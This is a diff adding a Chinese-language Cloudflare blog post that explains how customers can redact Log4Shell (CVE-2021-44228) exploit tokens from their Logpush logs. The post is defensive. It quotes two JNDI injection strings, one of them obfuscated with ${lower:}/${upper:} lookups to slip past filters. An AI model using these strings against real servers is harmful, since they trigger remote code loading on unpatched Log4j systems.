@@ -1,0 +1,18 @@
+<div class="post-content lh-copy gray1">
+	<p>2021 年 12 月 9 日，<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" target="_blank">CVE-2021-44228</a>这种零日漏洞利用在全球曝光。该漏洞会影响 <a href="https://logging.apache.org/log4j/2.x/index.html" target="_blank">Apache Log4j 实用工具</a>。Cloudflare 立即<a href="https://blog.cloudflare.com/zh-cn/cve-2021-44228-log4j-rce-0-day-mitigation-zh-cn/">更新了我们的 WAF</a>，以帮助防御该漏洞，但我们建议客户尽快更新其系统。</p>
+	<p>然而，我们了解许多 Cloudflare 客户通过使用 Log4j 的软件使用其日志，因此我们还缓解了通过 Cloudflare 日志的任何漏洞利用。截至本文发稿时，我们在发送给客户的日志中发现高达 1000 次/秒的漏洞利用模式。</p>
+	<p>客户可以立即开始更新其 Logpush 作业，以自动修改可能触发此漏洞的令牌。您可以在我们的<a href="https://developers.cloudflare.com/logs/reference/logpush-api-configuration#options" target="_blank">开发人员文档</a>中阅读更多相关信息，或查看下面的详情。</p>
+	<h3 id="-"><strong>攻击的工作方式</strong></h3>
+	<p>您可以在<a href="https://blog.cloudflare.com/zh-cn/inside-the-log4j2-vulnerability-cve-2021-44228-zh-cn/">此处我们的博客帖子</a>中阅读有关 Log4j 漏洞工作方式的更多信息。简而言之，攻击者可以在任何字符串中添加诸如 ${jndi:ldap://example.com/a} 之类的内容。Log4j 会在互联网上建立连接以检索此对象。</p>
+	<p>Cloudflare 日志包含由公共互联网上的最终用户控制的许多字符串字段，例如用户代理和 URL 路径。通过此漏洞，恶意用户有可能在读取这些字段并使用未修补的 Log4j 实例的任何系统上进行远程代码执行。</p>
+	<h3 id="--1"><strong>我们的缓解方案</strong></h3>
+	<p>遗憾的是，仅仅检查诸如 ${jndi:ldap 之类的令牌不足以防御此漏洞。由于模板中使用强大的语言表达式，还有必要检查混淆的变体。我们已经发现攻击者在使用诸如 ${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce} 之类的真实用例变种。因此，修改令牌 ${ 是防御此漏洞的最常规方法。</p>
+	<p>令牌 ${ 在我们目前发送给客户的日志中出现的频率高达 1,000 次/秒。对一些记录进行抽查表明，该令牌的许多情况并<em>不是</em>企图利用此漏洞。因此我们无法安全地修改日志，而不影响可能预期在其日志中出现此令牌的客户。</p>
+	<p>从现在开始，客户可以更新其 Logpush 作业以修改所有地方的字符串 ${ 并将其替换为 x{。</p>
+	<p>为此，客户可以更新其 Logpush 作业选项配置以包括参数 CVE-2021-44228=true。有关如何使用 Logpush API 执行此操作的详细说明，请参阅<a href="https://developers.cloudflare.com/logs/reference/logpush-api-configuration/examples/example-logpush-curl#step-6---updating-logpull_options" target="_blank">我们的开发人员文档</a>中的示例。请注意，此选项目前在 Cloudflare Dashboard 中不可用，仅可使用 API 进行修改。</p>
+	<p><a href="https://twitter.com/intent/tweet?in_reply_to=1470704925785169921" target="_blank"><strong>在 Twitter 上讨论</strong></a> <a href="https://news.ycombinator.com/item?id=29551847" target="_blank"><strong> 在 Hacker News 上讨论</strong></a> <a href="https://reddit.com/r/CloudFlare/comments/rg5erl/sanitizing_cloudflare_logs_to_protect_customers/" target="_blank"><strong> 在 Reddit 上讨论</strong></a></p>
+	<p><a href="https://blog.cloudflare.com/tag/logs/">日志</a> <a href="https://blog.cloudflare.com/tag/vulnerabilities/">漏洞</a> <a href="https://blog.cloudflare.com/tag/zero-day-threats/">零日威胁</a> <a href="https://blog.cloudflare.com/tag/security/">安全性</a> <a href="https://blog.cloudflare.com/tag/log4j/">Log4J</a></p>
+	<p>在 Twitter 上关注 Cloudflare</p>
+	<p>Jon Levine |<a href="https://twitter.com/@jplevine" target="_blank">@jplevine</a></p>
+	<p>Cloudflare 丨<a href="https://twitter.com/Cloudflare" target="_blank">Cloudflare</a><br></p>
+</div>
